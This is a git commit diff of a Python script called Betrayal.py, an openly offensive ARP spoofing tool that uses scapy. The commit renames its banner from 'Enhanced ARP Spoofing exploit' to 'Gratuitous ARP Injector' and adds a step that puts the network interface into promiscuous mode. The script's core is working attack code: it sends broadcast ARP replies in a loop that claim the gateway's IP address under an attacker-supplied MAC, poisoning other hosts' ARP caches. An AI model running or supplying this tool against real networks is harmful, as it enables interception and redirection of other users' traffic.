618be31c819b10f95bc47cacfa396a472d9b4d4c
Magama Bazarov <88490676+in9uz@users.noreply.github.com>
2022-10-30 17:22:09 +0500

    Add files via upload

--- Betrayal.py
+++ Betrayal.py
@@ -13,13 +13,16 @@ print (r"""
       ░                                   ░ ░                                                                                                             
     """)
 
-print ("Enhanced ARP Spoofing exploit")
+print ("Gratuitous ARP Injector")
 print("Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>\n")
 
 from scapy.all import *
 from scapy.layers.l2 import *
 import argparse
+import colorama
+from colorama import Fore, Style
 
+colorama.init(autoreset=True)
 
 l2broad = "FF:FF:FF:FF:FF:FF"
 
@@ -32,21 +35,29 @@ def take_args():
 
     return args
 
-
 args = take_args()
+
+def switch_to_promisc(interface):
+    print(Fore.YELLOW + Style.BRIGHT + "\n[!] Switching " + Fore.BLUE + Style.BRIGHT + interface + Fore.YELLOW + Style.BRIGHT + " to promiscious mode")
+    subprocess.call(["ip", "link", "set", interface, "promisc", "on"])
+    ip_a_result = subprocess.check_output(["ip", "add", "show", interface])
+    promisc_mode_search = re.search(r"PROMISC", ip_a_result.decode())
+    if promisc_mode_search:
+        print (Fore.YELLOW + Style.BRIGHT + "[*] Switched " + Fore.BLUE + Style.BRIGHT + "successfully")
+    else:
+        print (Fore.RED + Style.BRIGHT + "[!] Error. Not switched to promisc.")
 
 
 def exploit(gateway, interface, evilmac):
     ether_frame = Ether(src=args.evilmac, dst=l2broad)
     arp_frame = ARP(op="is-at", pdst=args.gateway, hwsrc=args.evilmac, hwdst=l2broad, psrc=args.gateway)
-    grat_frame = ether_frame / arp_frame
-    grat_frame.show()
-    sendp(grat_frame, iface=args.interface, inter=0.3, loop=1, verbose=1)
+    garp_frame = ether_frame / arp_frame
+    sendp(garp_frame, iface=args.interface, inter=0.8, loop=1, verbose=1)
 
-
-    
-    
+switch_to_promisc(args.interface)
 exploit(args.interface, args.evilmac, args.gateway)
+
+
 
     
 
